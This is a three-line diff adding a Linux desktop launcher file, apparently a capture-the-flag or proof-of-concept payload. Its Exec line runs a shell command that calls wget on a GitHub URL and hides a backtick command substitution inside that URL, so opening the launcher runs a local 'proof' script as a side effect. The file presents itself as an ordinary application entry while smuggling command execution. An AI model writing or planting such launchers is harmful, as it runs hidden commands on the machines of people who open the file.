@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget https://github.com/just0111ctf/example.desktop/new/main`/proof*.sh`"
+Type=Application
